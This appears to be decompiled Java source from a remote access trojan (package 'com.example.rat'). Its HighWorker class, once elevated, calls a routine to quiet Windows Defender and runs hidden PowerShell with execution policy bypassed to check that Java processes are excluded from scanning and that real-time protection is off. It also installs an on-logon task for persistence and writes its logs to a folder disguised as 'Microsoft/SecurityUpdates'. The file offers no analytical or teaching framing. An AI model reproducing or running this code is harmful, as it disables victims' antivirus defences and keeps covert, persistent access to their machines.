package com.example.rat;

import com.example.screen.ScreenShareSender;
import com.example.screen.ScreenShareSenderAuto;
import com.sun.jna.platform.win32.Advapi32Util;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.TimeUnit;

public final class HighWorker {
   public static void main(String[] args) {
      boolean system = isSystem();
      boolean elevated = isElevated();
      log("start elevated=" + elevated + " system=" + system + " user=" + System.getProperty("user.name"));
      if (!elevated) {
         log("not elevated: nothing to do");
         writeStatus(elevated, system, "skipped");
      } else {
         String defender = "unknown";

         try {
            ScreenShareSender.defenderQuiet();
            defender = checkDefender();
            log("defender quiet done, applied=" + defender);
         } catch (Throwable t) {
            log("defender quiet failed: " + t);
         }

         if (!system) {
            try {
               ScreenShareSenderAuto.installOnLogonTask();
               log("onlogon task: ok");
            } catch (Throwable t) {
               log("onlogon task failed: " + t);
            }
         }

         writeStatus(elevated, system, defender);
         log("done");
         System.exit(0);
      }
   }

   private static String checkDefender() {
      try {
         String ps = "$tp='?';$rtp='?';$proc='0';$path='0';try{$s=Get-MpComputerStatus;$tp=$s.IsTamperProtected;$rtp=$s.RealTimeProtectionEnabled}catch{};try{$p=Get-MpPreference;$e=$p.ExclusionProcess;if($e -contains 'javaw.exe' -or $e -contains 'java.exe'){$proc='1'};if(($p.ExclusionPath -join ';') -like '*SecurityUpdates*'){$path='1'}}catch{};\"tp=$tp rtp=$rtp proc=$proc path=$path\"";
         ProcessBuilder pb = new ProcessBuilder(
            "powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", ps
         );
         pb.redirectErrorStream(true);
         Process p = pb.start();
         StringBuilder out = new StringBuilder();
         InputStream is = p.getInputStream();

         try {
            byte[] b = new byte[4096];

            int n;
            while ((n = is.read(b)) != -1) {
               out.append(new String(b, 0, n, StandardCharsets.UTF_8));
            }
         } catch (Throwable var8) {
            if (is != null) {
               try {
                  is.close();
               } catch (Throwable var7) {
                  var8.addSuppressed(var7);
               }
            }

            throw var8;
         }

         if (is != null) {
            is.close();
         }

         p.waitFor(30L, TimeUnit.SECONDS);
         String s = out.toString().trim();
         log("defender state: " + s);
         boolean proc = s.contains("proc=1");
         boolean rtpOff = s.contains("rtp=false") || s.contains("rtp=False");
         if (proc && rtpOff) {
            return "ok";
         } else {
            return proc ? "partial" : "fail";
         }
      } catch (Throwable t) {
         log("defender state failed: " + t);
         return "unknown";
      }
   }

   private static void writeStatus(boolean elevated, boolean system, String defender) {
      try {
         File dir = appDir();
         dir.mkdirs();
         String body = "ts="
            + System.currentTimeMillis()
            + "\nstage="
            + (system ? "system" : "high")
            + "\nelevated="
            + (elevated ? "1" : "0")
            + "\ndefender="
            + defender
            + "\n";
         FileOutputStream out = new FileOutputStream(new File(dir, "helper.status"));

         try {
            out.write(body.getBytes(StandardCharsets.UTF_8));
         } catch (Throwable var9) {
            try {
               out.close();
            } catch (Throwable var8) {
               var9.addSuppressed(var8);
            }

            throw var9;
         }

         out.close();
      } catch (Throwable var10) {
      }
   }

   private static File appDir() {
      String appData = System.getenv("APPDATA");
      File base = appData != null && !appData.trim().isEmpty() ? new File(appData) : new File(System.getProperty("user.home", "."));
      return new File(base, "Microsoft/SecurityUpdates");
   }

   private static boolean isElevated() {
      try {
         return Advapi32Util.isCurrentProcessElevated();
      } catch (Throwable t) {
         return false;
      }
   }

   private static boolean isSystem() {
      String user = System.getProperty("user.name", "");
      return "system".equalsIgnoreCase(user);
   }

   private static void log(String msg) {
      String line = "[" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + "] " + msg;

      try {
         File dir = appDir();
         dir.mkdirs();
         FileOutputStream out = new FileOutputStream(new File(dir, "helper.log"), true);

         try {
            out.write((line + "\r\n").getBytes(StandardCharsets.UTF_8));
         } catch (Throwable var7) {
            try {
               out.close();
            } catch (Throwable var6) {
               var7.addSuppressed(var6);
            }

            throw var7;
         }

         out.close();
      } catch (Throwable var8) {
      }
   }
}
